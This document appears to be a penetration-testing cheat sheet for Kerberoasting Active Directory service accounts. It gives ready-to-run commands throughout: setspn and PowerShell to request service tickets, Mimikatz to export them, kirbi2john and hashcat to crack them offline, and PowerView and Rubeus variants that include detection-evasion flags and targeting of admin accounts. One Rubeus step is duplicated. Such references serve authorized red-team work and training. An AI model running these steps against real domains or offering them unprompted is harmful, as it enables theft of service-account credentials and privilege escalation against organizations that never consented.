---
legal-banner: true
---

### **STEP 1: PREPARATION AND SPN ENUMERATION**

1.  List all Service Principal Names (SPNs) in the domain:  
    `setspn.exe -Q */*`
2.  Add .NET Framework class to PowerShell session:  
    `Add-Type -AssemblyName System.IdentityModel`
3.  Request a Ticket Granting Service (TGS) ticket for a specific SPN:  
    `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-SQL-hackfast.example.local:1433"`
4.  Retrieve all tickets:  
    `setspn.exe -T EXAMPLE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`

### **STEP 2: EXPORT AND PREPARE KERBEROS TICKETS**

5.  Use Mimikatz to list and export Kerberos tickets:  
    `mimikatz # kerberos::list /export`
6.  Convert tickets to base64 for easier transport:  
    `mimikatz # base64 /out:true`
7.  Remove new lines and spaces:  
    `echo "[BASE64 BLOB]" | tr -d \\n`
8.  Save the blob to a .kirbi file:  
    `cat encoded_file | base64 -d > sqldev.kirbi`

### **STEP 3: EXTRACT AND CRACK THE KERBEROS TICKET**

9.  Extract the Kerberos ticket using kirbi2john.py:  
    `python2.7 kirbi2john.py sqldev.kirbi > crack_file`
10. Modify the file for Hashcat:  
    `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
11. Confirm the prepared hash:  
    `cat sqldev_tgs_hashcat`
12. Crack the hash with Hashcat:  
    `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`

### **POWERVIEW FOR SPN ENUMERATION AND TICKET EXTRACTION**

1.  Import PowerView:  
    `Import-Module .\PowerView.ps1`
2.  List domain users with SPNs:  
    `Get-DomainUser * -spn | select samaccountname`
3.  Get SPN tickets for a specific user and format for Hashcat:  
    `Get-DomainUser -Identity [USERNAME] | Get-DomainSPNTicket -Format Hashcat`

### **RUBEUS FOR ADVANCED KERBEROASTING TECHNIQUES**

1.  Perform Kerberoasting and output hashes to a file:  
    `.\Rubeus.exe kerberoast /outfile:hashes.txt`
    
2.  Perform Kerberoasting with alternate credentials:  
    `.\Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`
    
3.  Perform Kerberoasting with an existing TGT:  
    `.\Rubeus.exe kerberoast /ticket:BASE64 | /ticket:FILE.KIRBI`
    
4.  Perform "opsec" Kerberoasting:  
    `.\Rubeus.exe kerberoast /rc4opsec`
    
5.  Perform "opsec" Kerberoasting:  
    `.\Rubeus.exe kerberoast /rc4opsec`
    
6.  Request tickets for accounts with an admin count of 1:  
    `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1'`
    
7.  Perform Kerberoasting with a delay and jitter:  
    `.\Rubeus.exe kerberoast /delay:5000 /jitter:30`